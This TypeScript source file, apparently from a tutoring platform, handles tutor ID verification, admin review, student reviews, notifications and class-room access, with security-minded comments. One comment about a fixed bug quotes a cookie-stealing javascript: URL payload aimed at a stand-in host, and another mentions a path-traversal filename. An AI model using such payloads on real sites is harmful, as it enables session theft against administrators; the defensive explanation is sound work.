  /* Persist. Files land under STORAGE_DIR/verification/<tutorId>/ — outside
     /public, so nothing here is ever served statically; the only reader is the
     admin-gated route in app/api/admin/doc/[id]. `mine.id` comes from the session's
     own tutor row, so a tutor can only ever write into their OWN folder. */
  const dir = join(STORAGE_ROOT, mine.id);
  await mkdir(dir, { recursive: true });
  for (const { kind, bytes, mime, file } of incoming) {
    // safeFileName() strips directory components and everything outside
    // [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to a
    // flat, inert name. The kind + timestamp prefix keeps it unique and non-guessable-ish.
    const safe = `${kind}-${Date.now()}-${safeFileName(file.name, 60)}`;
    await writeFile(join(dir, safe), bytes);
    await db.insert(verificationDocs).values({
      tutorId: mine.id,
      kind,
      // Store the SANITIZED name: this string is echoed into a Content-Disposition
      // header by the admin doc route, and the raw client name could carry CR/LF.
      fileName: safeFileName(file.name, 60),
      /* POSIX separators, ALWAYS. node:path.join is platform-dependent, so this
         column filled up with "verification\<id>\<file>" on Windows and
         "verification/<id>/<file>" on Linux — the same logical path stored two
         ways. Both readers split on /[\/]+/ so it resolved either way, but the
         stored value was not canonical: any future consumer that uses it verbatim
         (a URL, a LIKE query, a join) silently misses half the rows.
         scripts/sql/0006 normalises the rows that already exist. */
      storagePath: ["verification", mine.id, safe].join("/"),
      mime,                 // the SNIFFED type — never the client's claim
      sizeBytes: bytes.length,
    });
  }

  /* Text + link fields.

     BUG (fixed): these were written straight through with a bare
     `typeof v === "string" ? v.trim() : null` — no length bound and, more
     importantly, NO URL VALIDATION, unlike createClass which runs vOptionalUrl on
     meetUrl. The seven *Url fields land in the tutors row, come back out through
     getPendingVerifications()/getMyVerification(), and are rendered as <a href> on
     the admin review page and the tutor's own page. A tutor submitting
     `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" was
     therefore planting a link that fires in the ADMIN's authenticated origin — the
     one session that can read every national ID scan in the system.

     vOptionalUrl enforces an http/https scheme allow-list (lib/validation.ts), which
     is exactly what kills javascript:, data: and file:. Text fields get bounded too. */
  const textField = (k: string, max: number) => vOptionalText(formData.get(k), { field: k, max });
  const urlField = (k: string) => vOptionalUrl(formData.get(k), { field: k, max: 300 });

  const institution = textField("institution", 160);
  if (!institution.ok) return { ok: false, error: institution.error };
  const languages = textField("languages", 120);
  if (!languages.ok) return { ok: false, error: languages.error };
  const pitch = textField("pitch", 1000);
  if (!pitch.ok) return { ok: false, error: pitch.error };

  const linkedin = urlField("linkedinUrl");
  if (!linkedin.ok) return { ok: false, error: linkedin.error };
  const instagram = urlField("instagramUrl");
  if (!instagram.ok) return { ok: false, error: instagram.error };
  const tiktok = urlField("tiktokUrl");
  if (!tiktok.ok) return { ok: false, error: tiktok.error };
  const youtube = urlField("youtubeUrl");
  if (!youtube.ok) return { ok: false, error: youtube.error };
  const facebook = urlField("facebookUrl");
  if (!facebook.ok) return { ok: false, error: facebook.error };
  const website = urlField("websiteUrl");
  if (!website.ok) return { ok: false, error: website.error };
  const introVideo = urlField("introVideoUrl");
  if (!introVideo.ok) return { ok: false, error: introVideo.error };

  const yearsRaw = formData.get("experienceYears");
  const years = typeof yearsRaw === "string" && yearsRaw.trim()
    ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0)) : null;

  await db.update(tutors).set({
    status: "pending", submittedAt: new Date(), reviewNote: null,
    experienceYears: years,
    institution: institution.value, languages: languages.value, pitch: pitch.value,
    linkedinUrl: linkedin.value, instagramUrl: instagram.value, tiktokUrl: tiktok.value,
    youtubeUrl: youtube.value, facebookUrl: facebook.value, websiteUrl: website.value,
    introVideoUrl: introVideo.value,
  }).where(eq(tutors.id, mine.id));

  /* Tell a human. Without this the queue was write-only: a tutor uploaded their
     national ID, several screens told them someone would look at it, and no signal
     of any kind left the database. Email rather than notify(): admins are an env
     allowlist (ADMIN_EMAILS) and may have no profile row to notify, and a review
     promise needs to reach them off-site rather than waiting for them to open a
     page they have no link to.

     Deliberately after the commit and deliberately not awaited into the result: the
     tutor's submission has already succeeded, and a misconfigured mailbox must
     never turn that into an error they cannot act on. Failures are logged loudly
     instead — a silent alerting gap is how the 48h promise quietly stops holding. */
  void notifyAdminsOfSubmission(mine.id, mine.slug, mine.fullName).catch(() => {});

  return { ok: true };
}


async function notifyAdminsOfSubmission(tutorId: string, slug: string, displayName: string): Promise<void> {
  const to = adminNotifyEmails();
  if (!to.length) {
    console.warn(
      "[Tnajem] verification submitted (tutor %s) but ADMIN_EMAILS is empty — nobody was alerted. " +
        "The review queue is at /admin/verifications.",
      tutorId,
    );
    return;
  }
  if (!mailEnabled()) {
    console.warn(
      "[Tnajem] verification submitted (tutor %s) but MAIL_* is not configured — no admin alert sent.",
      tutorId,
    );
    return;
  }
  const site = process.env.NEXT_PUBLIC_SITE_URL ?? "https://tnajem.tn";
  const subject = `Tnajem — nouvelle demande de vérification : ${displayName}`;
  const body =
    `${displayName} (/${slug}) vient d'envoyer ses documents de vérification.\n\n` +
    `File d'attente : ${site}/fr/admin/verifications\n`;
  for (const address of to) {
    const sent = await sendMail(address, subject, body);
    if (!sent) console.error("[Tnajem] admin alert failed for %s (tutor %s)", address, tutorId);
  }
}

export async function getMyVerification(): Promise<TutorVerification | null> {
  if (!dbReady) return null;
  const session = await getSession();
  if (!session) return null;
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return null;
  const docs = await db.select().from(verificationDocs).where(eq(verificationDocs.tutorId, mine.id));
  return {
    status: mine.status,
    experienceYears: mine.experienceYears ?? null,
    institution: mine.institution ?? null,
    languages: mine.languages ?? null,
    pitch: mine.pitch ?? null,
    links: {
      linkedin: mine.linkedinUrl ?? null, instagram: mine.instagramUrl ?? null, tiktok: mine.tiktokUrl ?? null,
      youtube: mine.youtubeUrl ?? null, facebook: mine.facebookUrl ?? null, website: mine.websiteUrl ?? null,
      introVideo: mine.introVideoUrl ?? null,
    },
    reviewNote: mine.reviewNote ?? null,
    docKinds: docs.map((d) => d.kind),
  };
}

export async function getPendingVerifications():
  Promise<{ ok: boolean; admin: boolean; items: PendingTutor[] }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, admin: false, items: [] };

  // Bounded: the review queue is a work list, not an export. Oldest submissions
  // first so nobody's application is starved at the bottom of an unbounded scan.
  const rows = await db
    .select()
    .from(tutors)
    .where(eq(tutors.status, "pending"))
    .orderBy(tutors.submittedAt)
    .limit(100);
  if (rows.length === 0) return { ok: true, admin: true, items: [] };

  /* N+1 (fixed): this ran one verification_docs SELECT per pending tutor inside the
     loop below. At 100 pending applications that was 101 round-trips for one page
     load. Fetch every doc for the batch in a single inArray query and group in memory. */
  const allDocs = await db
    .select()
    .from(verificationDocs)
    .where(inArray(verificationDocs.tutorId, rows.map((t) => t.id)));

  const docsByTutor = new Map<string, typeof allDocs>();
  for (const d of allDocs) {
    const list = docsByTutor.get(d.tutorId);
    if (list) list.push(d);
    else docsByTutor.set(d.tutorId, [d]);
  }

  const items: PendingTutor[] = [];
  for (const t of rows) {
    const docs = docsByTutor.get(t.id) ?? [];
    items.push({
      tutorId: t.id, slug: t.slug, name: t.fullName, subject: t.subject,
      experienceYears: t.experienceYears ?? null, institution: t.institution ?? null,
      languages: t.languages ?? null, pitch: t.pitch ?? null,
      links: {
        linkedin: t.linkedinUrl ?? null, instagram: t.instagramUrl ?? null, tiktok: t.tiktokUrl ?? null,
        youtube: t.youtubeUrl ?? null, facebook: t.facebookUrl ?? null, website: t.websiteUrl ?? null,
        introVideo: t.introVideoUrl ?? null,
      },
      submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
      docs: docs.map((d) => ({ id: d.id, kind: d.kind, fileName: d.fileName })),
    });
  }
  return { ok: true, admin: true, items };
}

export async function approveTutor(input: { tutorId: string }): Promise<{ ok: boolean; error?: string }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, error: "forbidden" };
  const tutorId = vUuid(input.tutorId, { field: "tutor" });
  if (!tutorId.ok) return { ok: false, error: "not-found" };

  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
  if (!t) return { ok: false, error: "not-found" };

  // Separation of duties: an admin who also runs a tutor storefront must not be
  // able to verify their own identity documents. A second admin has to sign it off.
  if (t.profileId && t.profileId === session.profile.id) {
    return { ok: false, error: "self-approval-forbidden" };
  }
  // Only a submitted application can be approved — otherwise a draft tutor who
  // never uploaded an ID could be waved through by a misclick.
  if (t.status !== "pending") return { ok: false, error: "not-pending" };

  await db.update(tutors)
    .set({ status: "verified", verified: true, reviewedAt: new Date(), reviewNote: null })
    .where(eq(tutors.id, tutorId.value));

  /* Make the decision effective NOW, not in up to 60s (STOREFRONT_TTL) / an hour
     (SITEMAP_TTL). On approve this is a UX win — the tutor's page and the sitemap
     go live the second the admin clicks. On reject (below) it is a compliance
     control. Both helpers are non-throwing: a cache problem must never roll back
     a decision that is already committed to the database. Done BEFORE notify(),
     which does SMS I/O and is the slow part of this action. */
  revalidateTutor(t.slug);
  revalidatePublicTutors(); // the public set changed → refresh the sitemap

  // The tutor was never told before — they just watched a silent page.
  if (t.profileId) {
    await notify(t.profileId, {
      kind: "verification_approved",
      title: "Profil vérifié ✅",
      body: "Ton profil est validé. Ta page est en ligne et visible dans Explorer.",
      href: "/dashboard",
      sms: `Tnajem : ton profil est vérifié ✅ Ta page tnajem.tn/${t.slug} est en ligne.`,
    });
  }
  return { ok: true };
}

export async function rejectTutor(input: { tutorId: string; note?: string }): Promise<{ ok: boolean; error?: string }> {
  const session = await requireAdmin();
  if (!session) return { ok: false, error: "forbidden" };
  const note = vOptionalText(input.note, { field: "note", max: 500 });
  if (!note.ok) return { ok: false, error: note.error };
  const tutorId = vUuid(input.tutorId, { field: "tutor" });
  if (!tutorId.ok) return { ok: false, error: "not-found" };

  const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
  if (!t) return { ok: false, error: "not-found" };

  await db.update(tutors)
    .set({ status: "rejected", verified: false, reviewedAt: new Date(), reviewNote: note.value })
    .where(eq(tutors.id, tutorId.value));

  /* THE COMPLIANCE ONE. getStorefront() returns null for a non-verified tutor and
     the page 404s — but app/[slug]/page.tsx is ISR-cached for 60s, so without this
     the page of a tutor we have just REJECTED (possibly for a failed ID check, on
     a platform used by minors) keeps being served to the public for up to another
     minute, and the sitemap keeps advertising it for up to an hour. The TTL is the
     backstop; this is the control. Non-throwing by design — see approveTutor. */
  revalidateTutor(t.slug);
  revalidatePublicTutors(); // drop them from the cached sitemap too

  if (t.profileId) {
    await notify(t.profileId, {
      kind: "verification_rejected",
      title: "Dossier à compléter",
      body: note.value
        ? `Ton dossier n'a pas été validé : ${note.value}. Tu peux corriger et renvoyer.`
        : "Ton dossier n'a pas été validé. Vérifie tes documents et renvoie ta demande.",
      href: "/onboarding/verify",
      sms: "Tnajem : ton dossier de vérification doit être complété. Détails dans ton espace prof.",
    });
  }
  return { ok: true };
}

/* ---------- Explore feed (real, verified tutors only) ----------
   rating/review_count come from the reviews table, price_from from the tutor's
   cheapest published class. Filters: `subject` (chip) + `q` (free text over name,
   subject, level, bio). Demo mode (no DATABASE_URL) → null so the Explore page
   keeps its static preview; with a DB, an empty catalogue returns [] — we never
   pass demo tutors off as real ones. */
export async function getExploreTutors(filters?: { subject?: string; q?: string }): Promise<ExploreTutor[] | null> {
  /* null → the client renders its static demo preview (DEV ONLY). In production a
     missing DB must never surface fabricated tutors: return [] so /explore shows
     its honest empty state instead. */
  if (!dbReady) return demoEnabled ? null : [];

  /* PORTED to apps/api (GET /tutors/explore).

     callAnonymous, NOT call: this runs during SSR on a cached route. Touching
     cookies() or headers() here would throw inside unstable_cache and silently
     opt the route out of caching outside it. e2e/isr.spec.ts guards that. */
  const qs = new URLSearchParams();
  if (filters?.subject) qs.set("subject", filters.subject);
  if (filters?.q) qs.set("q", filters.q);
  const suffix = qs.toString() ? `?${qs.toString()}` : "";
  return callAnonymous<ExploreTutor[]>(`/tutors/explore${suffix}`);
}

export async function createReview(input: { classId: string; rating: number; text?: string }): Promise<ActionResult> {
  const rating = vRating(input.rating);
  if (!rating.ok) return { ok: false, error: rating.error };
  const text = vOptionalText(input.text, { field: "review", max: 1000 });
  if (!text.ok) return { ok: false, error: text.error };

  if (!dbReady) return { ok: true, demo: true };
  const classId = vUuid(input.classId, { field: "class" });
  if (!classId.ok) return { ok: false, error: "not-found" };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  const rl = await checkRateLimit(`review:${uid}`, 10, 60 * 60_000); // 10 review attempts / hour
  if (!rl.ok) return { ok: false, error: "too-many-requests" };

  const [cls] = await db.select().from(classes).where(eq(classes.id, classId.value)).limit(1);
  if (!cls) return { ok: false, error: "not-found" };

  /* AUTHZ (held): you may only review a class you actually booked. The unique
     (student_id, class_id) index makes it once. Note the review is attributed to
     cls.tutorId read from the DB — NOT to any tutor id supplied by the caller — so
     there is no way to spray 5★ reviews onto someone else's storefront. */
  const [bk] = await db.select().from(bookings)
    .where(and(eq(bookings.classId, cls.id), eq(bookings.studentId, uid))).limit(1);
  if (!bk || bk.status === "cancelled") return { ok: false, error: "not-booked" };

  // No reviewing a class that hasn't happened yet.
  if (new Date(cls.scheduledAt).getTime() > Date.now()) return { ok: false, error: "class-not-started" };

  /* Insert + stat recompute in ONE transaction. recomputeTutorStats() is now a
     single UPDATE with the aggregates as subqueries (see its comment), so two
     students reviewing the same tutor concurrently can no longer both read the
     old average and write it back — the lost-update that silently dropped a review
     from the public rating. */
  try {
    await db.transaction(async (tx) => {
      await tx.insert(reviews).values({
        tutorId: cls.tutorId, studentId: uid, classId: cls.id,
        rating: rating.value, text: text.value,
      });
      await recomputeTutorStats(cls.tutorId, tx);
    });
  } catch {
    return { ok: false, error: "already-reviewed" }; // unique(student, class)
  }

  /* The storefront shows the rating + the review feed, both cached for 60s. Bust
     them so the tutor's stars move immediately. One extra point-lookup for the
     slug (indexed PK), outside the transaction — the tx above is a write path and
     must not be held open for a cache concern. */
  const [tut] = await db.select({ slug: tutors.slug }).from(tutors)
    .where(eq(tutors.id, cls.tutorId)).limit(1);
  revalidateTutor(tut?.slug);

  return { ok: true };
}

/** Reviews for a public storefront. Unknown slug → empty (never throws for a 404 page). */
export async function getTutorReviews(tutorSlug: string): Promise<TutorReviews> {
  const empty: TutorReviews = { items: [], average: 0, count: 0 };
  if (!dbReady) return empty;
  if (typeof tutorSlug !== "string" || !tutorSlug.trim()) return empty;

  /* PORTED to apps/api (GET /tutors/:slug/reviews).

     callAnonymous is MANDATORY here, not a preference: [slug]/page.tsx calls this
     from INSIDE unstable_cache, where Next 14 throws on cookies(). This is also
     the most-shared URL in the product, so a silent cache opt-out here is the
     single most expensive mistake available in Step 4. */
  return callAnonymous<TutorReviews>(`/tutors/${encodeURIComponent(tutorSlug.trim())}/reviews`);
}

export async function getNotifications(): Promise<NotificationItem[]> {
  if (!dbReady) return [];
  const session = await getSession();
  if (!session) return [];

  const rows = await db
    .select()
    .from(notifications)
    .where(eq(notifications.profileId, session.profile.id))
    .orderBy(desc(notifications.createdAt))
    .limit(50);

  return rows.map((n) => ({
    id: n.id,
    kind: n.kind as NotificationKind,
    title: n.title,
    body: n.body,
    href: n.href ?? null,
    read: Boolean(n.readAt),
    createdAt: new Date(n.createdAt).toISOString(),
  }));
}

/** Marks the caller's unread notifications as read (all of them, or just `ids`). */
export async function markNotificationsRead(input?: { ids?: string[] }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };

  // isUuid filter: a non-uuid string here would reach a uuid column and throw 22P02.
  // The scope below is what enforces ownership — ids only ever narrow it, never widen it.
  const ids = (input?.ids ?? []).filter((s) => isUuid(s)).slice(0, 100);
  const scope = and(eq(notifications.profileId, session.profile.id), isNull(notifications.readAt));
  await db.update(notifications).set({ readAt: new Date() })
    .where(ids.length ? and(scope, inArray(notifications.id, ids)) : scope);
  return { ok: true };
}

/* ---------- Live room access ----------
   The live page must not be open to anyone holding the URL: you can join only if
   you booked the class (active booking) or you're the tutor who owns it. */
export async function canJoinClass(classId: string): Promise<{
  canJoin: boolean; role?: "tutor" | "student"; meetUrl?: string; reason?: string;
}> {
  // Dev demo mode opens the room so the flow is walkable without a DB. In
  // production a missing DB must NEVER open a live room to anyone with the URL.
  if (!dbReady) {
    return demoEnabled
      ? { canJoin: true, role: "student", meetUrl: liveRoomUrl(classId) }
      : { canJoin: false, reason: "not-found" };
  }
  if (!isUuid(classId)) return { canJoin: false, reason: "not-found" };
  const session = await getSession();
  if (!session) return { canJoin: false, reason: "not-authenticated" };
  const uid = session.profile.id;

  const [cls] = await db.select().from(classes).where(eq(classes.id, classId)).limit(1);
  if (!cls) return { canJoin: false, reason: "not-found" };

  const [tut] = await db.select().from(tutors).where(eq(tutors.id, cls.tutorId)).limit(1);
  if (tut?.profileId === uid) return { canJoin: true, role: "tutor", meetUrl: resolveMeetUrl(cls) };

  const [bk] = await db.select().from(bookings)
    .where(and(eq(bookings.classId, cls.id), eq(bookings.studentId, uid))).limit(1);
  if (bk && bk.status !== "cancelled") return { canJoin: true, role: "student", meetUrl: resolveMeetUrl(cls) };

  return { canJoin: false, reason: "not-booked" };
}
